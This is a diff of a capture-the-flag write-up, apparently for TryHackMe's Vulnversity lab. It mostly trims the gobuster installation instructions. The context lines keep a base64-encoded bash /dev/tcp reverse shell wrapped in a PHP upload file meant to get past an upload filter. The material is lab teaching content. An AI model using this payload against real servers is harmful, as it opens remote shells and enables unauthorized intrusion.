@@ -65,50 +65,21 @@ http://ip_address:3333/robots.txt
 
 We can't find any hidden directories. Let's try to find any vulnerabilities on the web pages we will find using our toolset where possibly we can upload our reverse shell to gain initial access to the server. There's a lot of tools available. But on this write-up I'll use gobuster.
 
+### Install gobuster
+
 If you are using kali 2020.2 you just need to run
 ```
 sudo apt install gobuster -y
 ```
-
 to install gobuster.
 
 If you are using other pentesting distro, or lower versions of kali we might need to build it from scratch.
 
 To install go lang, go to: [https://golang.org/doc/install?download=go1.14.6.linux-amd64.tar.gz](https://golang.org/doc/install?download=go1.14.6.linux-amd64.tar.gz)
 
-or simply run:
-```
-curl -fsSo go1.14.6.linux-amd64.tar.gz https://golang.org/doc/install?download=go1.14.6.linux-amd64.tar.gz
-```
-
-Install go:
-```
-sudo tar -C /usr/local -xzf go1.14.6.linux-amd64.tar.gz
-```
-Now we need to put the path so we can call the "go" command on terminal without going to the absolute path and run the source:
-```
-echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.bashrc
-source .bashrc
-```
-
-You may check [golang documentation](https://golang.org/doc/install) for more details here.
-
-Now we installed go lang, we do not need to build it from source. Just download the dependencies (Much easier right?)
-```
-cd /opt
-sudo git clone https://github.com/OJ/gobuster
-cd gobuster
-sudo go get && sudo go build 
-```
-
-If you want to put it in path, just export it:
-```
-echo "export PATH=$PATH:/usr/local/go/bin:/opt/gobuster/gobuster"
-```
-
 To verify your installation make sure that you will see the helpscreen:
 ```
-gobuster --help
+/path/gobuster --help
 ```
 
 ![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/gobuster.png)
@@ -129,7 +100,6 @@ We now need to check what is the extension type to upload so we can bypass the c
 Or why not create one?
 
 ```
-sudo apt install -y xclip
 echo "bash -i >& /dev/tcp/<ip_address>/<port> 0>&1" | base64 | xclip
 echo '<?php echo system("echo sub | base64 -d | bash"); ?>' | sed s/sub/$(xclip -o)/g > revshell.php
 ```
